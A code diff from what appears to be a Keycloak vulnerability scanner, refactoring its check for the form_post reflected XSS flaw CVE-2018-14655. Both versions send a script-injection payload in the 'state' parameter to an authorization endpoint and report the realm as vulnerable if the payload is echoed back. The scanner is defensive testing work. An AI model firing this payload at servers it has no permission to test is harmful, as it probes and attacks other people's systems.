@@ -1,72 +1,47 @@
-from typing import Dict
+from typing import Set
 
 from keycloak_scanner.logging.vuln_flag import VulnFlag
-from keycloak_scanner.scanners.clients_scanner import Clients
-from keycloak_scanner.scanners.realm_scanner import Realms, Realm
-from keycloak_scanner.scanners.scanner import Scanner
-from keycloak_scanner.scanners.scanner_pieces import Need3
-from keycloak_scanner.scanners.well_known_scanner import WellKnownDict
+from keycloak_scanner.scan_base.scanner import Scanner
+from keycloak_scanner.scan_base.types import FormPostXSS, WellKnown, Client, Realm
+from keycloak_scanner.scan_base.wrap import WrapperTypes
 
 
-class FormPostXssResult:
-
-    def __init__(self, realm: Realm, is_vulnerable: bool):
-        self.realm = realm
-        self.is_vulnerable = is_vulnerable
-
-    def __repr__(self):
-        return f'FormPostXssResult({repr(self.realm)}, {self.is_vulnerable})'
-
-    def __eq__(self, other):
-        if isinstance(other, FormPostXssResult):
-            return self.realm == other.realm and self.is_vulnerable == other.is_vulnerable
-        return NotImplemented
-
-
-class FormPostXssResults(Dict[str, FormPostXssResult]):
-    pass
-
-
-class FormPostXssScanner(Need3[Realms, Clients, WellKnownDict], Scanner[FormPostXssResults]):
+class FormPostXssScanner(Scanner[FormPostXSS]):
 
     def __init__(self, **kwars):
-        super().__init__(**kwars)
+        super().__init__(result_type=WrapperTypes.FORM_POST_XSS,
+                         needs=[WrapperTypes.REALM_TYPE, WrapperTypes.CLIENT_TYPE, WrapperTypes.WELL_KNOWN_TYPE], **kwars)
 
-    def perform(self, realms: Realms, clients: Clients, well_known_dict: WellKnownDict, **kwargs) -> (FormPostXssResults, VulnFlag):
+    def perform(self, realm: Realm, client: Client, well_known: WellKnown, **kwargs) -> (Set[FormPostXSS], VulnFlag):
 
-        results = FormPostXssResults()
+        results = set()
 
         vf = VulnFlag()
 
-        for realm in realms:
+        if 'form_post' not in well_known.json['response_modes_supported']:
 
-            well_known = well_known_dict[realm.name]
+            super().verbose(f'post_form not in supported response types, can\' test CVE-2018-14655 for realm {realm}')
 
-            vulnerable = False
+        else:
 
-            if 'form_post' not in well_known.json['response_modes_supported']:
-                super().verbose(f'post_form not in supported response types, can\' test CVE-2018-14655 for realm {realm}')
+            url = well_known.json['authorization_endpoint']
 
-            else:
-                url = well_known.json['authorization_endpoint']
+            payload = 'af0ifjsldkj"/><script type="text/javascript">alert(1)</script> <p class="'
+            r = super().session().get(url, params={
+                    'state': payload,
+                    'response_type': 'token',
+                    'response_mode': 'form_post',
+                    'client_id': client.name,
+                    'nonce': 'csa3hMlvybERqcieLH'
+                 })
 
-                for client in clients:
+            if r.status_code == 200:
 
-                    payload = 'af0ifjsldkj"/><script type="text/javascript">alert(1)</script> <p class="'
-                    r = super().session().get(url, params={
-                            'state': payload,
-                            'response_type': 'token',
-                            'response_mode': 'form_post',
-                            'client_id': client.name,
-                            'nonce': 'csa3hMlvybERqcieLH'
-                         })
+                if payload in r.text:
 
-                    if r.status_code == 200:
-                        if payload in r.text:
-                            super().find('XSS-CVE2018-14655', 'Vulnerable to CVE 2018 14655 realm:{}, client:{}'.format(realm, client))
-                            vulnerable = True
-                            vf.set_vuln()
+                    super().find(f'XSS-CVE2018-14655', f'Vulnerable to CVE 2018 14655 realm:{realm.name}, client:{client.name}')
 
-            results[realm.name] = FormPostXssResult(realm, vulnerable)
+                    vf.set_vuln()
+                    results.add(FormPostXSS(realm))
 
         return results, vf
